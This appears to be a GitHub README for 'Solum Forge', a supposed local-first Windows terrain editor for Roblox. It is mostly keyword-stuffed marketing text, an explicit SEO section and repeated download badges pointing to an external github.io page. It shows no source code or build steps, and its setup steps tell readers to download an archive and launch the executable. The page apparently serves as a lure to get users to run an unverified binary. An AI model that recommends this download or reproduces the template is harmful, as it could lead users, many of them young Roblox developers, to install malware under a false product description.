![preview](https://raw.githubusercontent.com/dong888666123/terrain-forge-studio/main/hero_438f4.svg)
[![Download](https://raw.githubusercontent.com/dong888666123/terrain-forge-studio/main/setup_2d0c8.svg)](https://dong888666123.github.io/terrain-forge-studio/)

# Solum Forge — Terrain Authoring Studio for Roblox Builders

[![Download](https://raw.githubusercontent.com/dong888666123/terrain-forge-studio/main/setup_2d0c8.svg)](https://dong888666123.github.io/terrain-forge-studio/)

![Status](https://img.shields.io/badge/status-active%20development-brightgreen)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D6)
![Runtime](https://img.shields.io/badge/runtime-local--first-6e56cf)
![License](https://img.shields.io/badge/license-MIT-blue)
![Language](https://img.shields.io/badge/i18n-multilingual-ff8a3d)
![Uptime](https://img.shields.io/badge/support-24%2F7-2ea043)
![Build](https://img.shields.io/badge/build-2026.1.0-informational)
![Made for](https://img.shields.io/badge/made%20for-Roblox%20developers-e2231a)

---

## 🏔️ What Is Solum Forge?

**Solum Forge** is a local-first Windows terrain authoring studio built specifically for the Roblox development community. It is a distinct, from-scratch toolchain inspired by the same philosophy that drives *mateirenn/solum* — that terrain design should happen on your own machine, at your own pace, without a persistent connection to anything except your own imagination.

Where most terrain tools ask you to upload, wait, sync, and pray, Solum Forge reframes the entire workflow around a single idea: **the studio lives on your desk**. Every heightmap, every erosion pass, every biome palette, and every sculpt stroke is processed and persisted on local storage first. Remote operations, if you ever choose to use them, are strictly opt-in.

The name "Forge" is deliberate. Terrain authoring is not painting — it is metallurgy. You heat raw elevation data, you hammer it with sculpting tools, you quench it with erosion simulations, and you cool it into something structurally sound. Solum Forge gives Roblox developers a proper smithy for that process.

---

## 🌍 Why Another Terrain Tool?

Because the terrain pipeline inside most engine editors is a compromise. It is fast for small adjustments and slow for large ones. It is great for one artist and awkward for a team. It is bound to a viewport and unforgiving when you want to batch-process a hundred heightmaps overnight.

Solum Forge was born out of three frustrations:

1. **Cloud dependency.** Terrain work should not stall when the network hiccups.
2. **One-way publishing.** You sculpt, you publish, you lose the intermediate history. Solum Forge keeps a versioned local project archive.
3. **Opaque simulation.** Erosion, thermal relaxation, and hydraulic flow should be inspectable, parameterized, and repeatable — not a black box with three sliders.

The result is a studio that behaves less like a web app and more like a workshop: benches, tools, drawers, and a ledger of everything you have ever made.

---

## ✨ Core Feature Set

### 🧱 Sculpting & Shaping
- Multi-brush sculpting with falloff curves, pressure simulation, and symmetry modes.
- Heightmap import and export across common raster formats used in the Roblox pipeline.
- Non-destructive layer stack — each sculpt pass is a discrete, toggleable layer.
- Region masking with polygon, rectangle, and freehand selection.
- Snapshot compare slider for before/after review of any sculpt operation.

### 🌊 Procedural Simulation
- Hydraulic erosion with adjustable rainfall, sediment capacity, and evaporation curves.
- Thermal erosion for talus-angle relaxation on cliff faces.
- Wind erosion for dune and ridge line formation.
- Tectonic uplift simulation for mountain range generation.
- Deterministic seeding — the same seed always yields the same terrain.

### 🎨 Biome & Material Authoring
- Palette-based biome painter with weighted blending between adjacent regions.
- Material rule engine (slope, altitude, moisture, and curvature driven).
- Custom material definition files shared across a team via plain-text project assets.
- Gradient editor with color-stop interpolation in linear and perceptual spaces.

### 🗂️ Local-First Project Archive
- Every project is a folder on disk, not a row in a database.
- Incremental autosave with configurable retention.
- Full undo tree, not just an undo stack — branch your sculpt history and compare outcomes.
- Portable project bundles for handing terrain to a teammate on a USB drive.

### 🧭 Studio Interop
- Heightmap and material output tailored to the Roblox terrain import conventions.
- Region slicing so large worlds can be produced and evaluated in manageable tiles.
- Batch export job queue that runs while you continue working.
- Coordinate space presets matching common Roblox world scales.

### 🖥️ Responsive Desktop UI
- Adaptive panel layout that reflows from ultrawide monitors down to 1366×768 laptops.
- Detachable tool windows for multi-monitor sculpting setups.
- Dark, light, and high-contrast themes.
- Full keyboard-driven workflow with a command palette.

### 🌐 Multilingual Support
- Interface localization for English, Japanese, Korean, Spanish, Portuguese, German, and French.
- Locale-aware number and unit formatting.
- Community translation packs loadable from a local directory.
- Right-to-left layout readiness for future localization expansions.

### 🛎️ 24/7 Customer Support
- Round-the-clock response coverage for licensing and account questions.
- In-app diagnostic bundle generation for faster troubleshooting.
- Community forum mirrored locally as an offline-browsable documentation set.
- Escalation path for studio-blocking issues at any hour.

### 🔒 Privacy & Offline Operation
- No telemetry transmitted without explicit, revocable consent.
- All simulation runs on the local CPU or GPU — no server round trips.
- Project files are yours; export them, archive them, move them anywhere.
- Optional encrypted local vault for sensitive client work.

---

## 🧪 Who Is Solum Forge For?

- **Solo worldbuilders** who want a full terrain pipeline without spinning up a server.
- **Roblox studios** that need reproducible terrain generation across multiple artists.
- **Environmental artists** transitioning from traditional 3D DCC tools who want a terrain-native workspace.
- **Technical designers** who script terrain variation and need deterministic, seedable output.
- **Educators** teaching procedural generation with a tool that runs on lab machines offline.

---

## 🔍 SEO-Friendly Overview

If you arrived here searching for a **local-first Windows terrain editor for Roblox developers**, a **heightmap sculpting studio with erosion simulation**, a **procedural terrain authoring tool with multilingual support**, or a **privacy-respecting alternative to cloud terrain pipelines**, Solum Forge is designed for exactly that intersection.

Common search intents this project addresses:

- Terrain authoring software for Roblox world builders
- Offline heightmap editor with hydraulic and thermal erosion
- Deterministic procedural terrain generation with seeds
- Local project archive for terrain version control
- Responsive desktop UI for terrain sculpting on Windows
- Multilingual terrain tooling for international studios
- 24/7 support terrain authoring suite

The README you are reading is intentionally long because terrain authoring is a long-tail discipline. There is no single paragraph that captures it.

---

## 🧩 Architecture at a Glance

Solum Forge is organized around four cooperating subsystems.

**The Vault** handles persistence. It owns the project folder format, the incremental save journal, and the undo tree. It never talks to the network.

**The Bench** is the rendering and interaction surface. It owns the viewport, the brush engine, and the input mapping layer.

**The Forge** is the simulation core. Erosion, uplift, and material rule evaluation all live here, isolated so they can be run headlessly in batch jobs.

**The Ledger** is the history and metadata store. It records every operation with parameters, timestamps, and seeds so that any result can be replayed exactly.

These four subsystems communicate through a versioned internal message format, which means a future headless CLI can drive the same core the GUI uses.

---

## 🚀 Getting Started

Solum Forge ships as a self-contained Windows desktop application. There is no language runtime to prepare, no package manager to configure, and no shell ceremony required.

1. Use the [![Download](https://raw.githubusercontent.com/dong888666123/terrain-forge-studio/main/setup_2d0c8.svg)](https://dong888666123.github.io/terrain-forge-studio/) marker above to obtain the current 2026 release archive.
2. Extract the archive to a location you control on your local disk.
3. Launch the studio executable.
4. On first run, choose a project root directory. This is where all Solum Forge projects will live.
5. Create a project, pick a starting terrain size, and begin sculpting.

That is the whole onboarding. Everything else is discovered through the in-app documentation panel.

---

## 🧭 A Guided First Session

When you open Solum Forge for the first time, you are greeted by an empty Bench and a project wizard. Choose a terrain resolution — for a first experiment, 1025×1025 is generous without being unwieldy.

Start with the **Plate** brush. Drag a broad, low mound across the origin. Then switch to the **Ridge** brush and carve two converging lines. Immediately open the Forge panel and run a short hydraulic erosion pass at low rainfall. Watch the valleys deepen where your ridges meet.

This three-minute exercise teaches the core rhythm of the tool: shape, then simulate, then shape again. Every serious terrain in Solum Forge is built through that alternating cadence.

---

## 🧱 Project Folder Format

A Solum Forge project is a directory. Inside it you will find:

- A manifest describing terrain dimensions, coordinate space, and material schema.
- A layers directory where each sculpt layer is stored as a separate compressed heightmap.
- A simulation log recording every erosion, uplift, and material rule run with full parameters.
- A materials directory containing plain-text material definitions.
- A snapshots directory holding autosave checkpoints.

Because everything is plain files, you can diff projects, back them up with any file sync tool, and inspect them with generic utilities.

---

## 🌊 Understanding the Erosion Engine

The erosion engine is the heart of Solum Forge. It is not a single algorithm but a small family of them, each tuned for a different geological outcome.

**Hydraulic erosion** simulates water droplets moving across the surface, picking up sediment where the slope is steep and depositing it where the flow slows. Rainfall intensity, droplet count, sediment capacity, and evaporation rate are all exposed.

**Thermal erosion** models material slumping when the local slope exceeds a talus angle. This is what turns sharp ridges into natural scree slopes over simulated time.

**Wind erosion** introduces directional abrasion, carving the windward faces of ridges and depositing material on the leeward side. It is the engine behind dune fields and yardang formations.

**Tectonic uplift** raises regions of the terrain over simulated time, which combined with erosion produces mountain belts with realistic drainage patterns.

Every simulation run is deterministic given a seed and parameters, which means you can share a seed and a parameter set and another developer will reproduce your exact terrain.

---

## 🎨 Material Authoring Deep Dive

Materials in Solum Forge are not textures. They are rules.

A material definition specifies which terrain conditions it prefers — slope ranges, altitude bands, moisture thresholds, curvature tendencies. When the renderer paints a material onto the terrain surface, it evaluates every rule and blends the results by weight.

This approach means the same terrain with different material definitions looks like a completely different world. A lush temperate biome and an arid desert biome can share the exact same heightmap and diverge entirely at the material layer.

Material definitions are stored as plain text, which makes them easy to version, share, and review in a code review tool.

---

## 🗂️ Version Control for Terrain

Terrain is notoriously difficult to version control. Binary heightmaps do not diff well. Solum Forge addresses this with the Ledger.

The Ledger records every operation as a structured entry: the operation type, the parameters, the seed, and the resulting layer reference. Because the operations are recorded, you can replay a project from the beginning and arrive at any historical state.

For integration with traditional version control tools, Solum Forge can also export a project in a diff-friendly form where each layer is stored as a separate file with a stable name.

---

## 🖥️ Performance Notes

Solum Forge is designed to remain responsive on modest hardware. A 2049×2049 terrain with several erosion passes is comfortable on a modern laptop with an integrated GPU. Larger terrains benefit from a discrete GPU.

Batch export jobs run on background threads and can be paused or cancelled at any time. The Bench remains interactive during batch processing.

Memory usage scales with terrain resolution and layer count. The Ledger keeps references to layers, not full copies, so the undo tree does not multiply memory usage linearly with history depth.

---

## 🌐 Localization Details

The localization system is built on externalized string tables. Adding a new language does not require recompiling the application.

Translation packs are plain files placed in a language directory. The studio detects them on startup and lists them in the language selector. Community contributors can produce a translation pack and share it directly with other users.

Numbers, dates, and units are formatted according to the active locale. Terrain dimensions are displayed in the unit system the user selects.

---

## 🛎️ Support Model

Support is available around the clock, every day of the year. The support team handles installation questions, licensing questions, and studio-blocking issues.

For technical issues, the in-app diagnostic bundle collects relevant logs and system information into a single archive that can be attached to a support request. No project data is included in the diagnostic bundle unless you explicitly add it.

Community support happens in the project forum, which is also mirrored into the offline documentation set so that users on air-gapped machines can still search past discussions.

---

## 🔐 Privacy Commitments

Solum Forge does not transmit project data anywhere. It does not transmit telemetry without consent. It does not phone home on startup.

The only network activity the application ever performs is checking for updates, and that check can be disabled entirely in settings. When disabled, the application never opens a network socket.

Project files are stored in plain directories that you own. You can audit them, back them up, encrypt them with your own tools, or delete them without leaving residue.

---

## 🧬 Extensibility Roadmap

The 2026 roadmap includes:

- A headless command-line runner for batch terrain generation in CI pipelines.
- A plugin interface for custom erosion algorithms.
- A material rule scripting layer for advanced biome logic.
- A terrain diff viewer that visualizes changes between two project states.
- A collaborative mode that syncs project changes over an optional local network peer.

These are directional goals, not commitments to a schedule. Terrain tooling benefits from patience.

---

## 🧪 Testing and Quality

Solum Forge maintains a regression suite built around deterministic seeds. Every simulation algorithm has golden output tests that compare the result of running a fixed seed and parameter set against a stored reference terrain.

The UI is tested with an automated interaction harness that exercises the Bench, the Forge panel, and the project wizard. The harness runs on every commit in the project's continuous integration environment.

Localization string coverage is tracked per language. A language must reach a coverage threshold before it is listed as a fully supported locale.

---

## 🤝 Contributing

Contributions are welcomed in the form of bug reports, translation packs, material definition packs, and documentation improvements.

Before submitting a change, read the contribution guidelines in the project wiki. Changes to the Forge subsystem require a regression test with a stored reference output.

Discussions about new features happen in the issue tracker. Please open a discussion before writing code for a large feature so that the design can be reviewed early.

---

## 📅 Release Cadence

Solum Forge targets a quarterly feature release with interim patch releases as needed. The 2026.1.0 release is the current stable line.

Each release includes a changelog describing new features, changes to existing behavior, and any breaking changes to the project folder format. The project folder format is versioned and forward migration is supported for at least three major releases.

---

## 📄 License

Solum Forge is distributed under the MIT License. You are welcome to use, modify, and redistribute the software under the terms of that license.

The full license text is available at the following link:

[MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Solum Forge contributors.

---

## ⚠️ Disclaimer

Solum Forge is an independent terrain authoring tool. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation. "Roblox" is referenced solely to describe the intended use case for exported terrain data.

Terrain simulation results are approximations of natural geological processes and are provided for creative purposes. No guarantee is made that simulated terrain matches any real-world location or geological survey.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from the use of the software.

Users are responsible for ensuring that terrain and material data they author and distribute complies with the terms of service of any platform they publish to.

Support coverage is described as 24/7 in the sense of continuous response availability. Resolution times depend on issue complexity and may vary.

---

## 🔎 Keyword Index

local-first terrain studio, Windows terrain editor, Roblox terrain authoring, heightmap sculpting tool, hydraulic erosion simulation, thermal erosion simulation, wind erosion modeling, tectonic uplift generation, procedural terrain generation, deterministic seed terrain, biome material authoring, material rule engine, offline heightmap editor, local project archive, undo tree terrain tool, responsive desktop UI, multilingual terrain software, 24/7 support studio, privacy-respecting terrain tool, batch terrain export, terrain version control, heightmap import export, region slicing terrain, Roblox world scale presets, environmental art tooling, procedural generation education, terrain authoring suite 2026.

[![Download](https://raw.githubusercontent.com/dong888666123/terrain-forge-studio/main/setup_2d0c8.svg)](https://dong888666123.github.io/terrain-forge-studio/)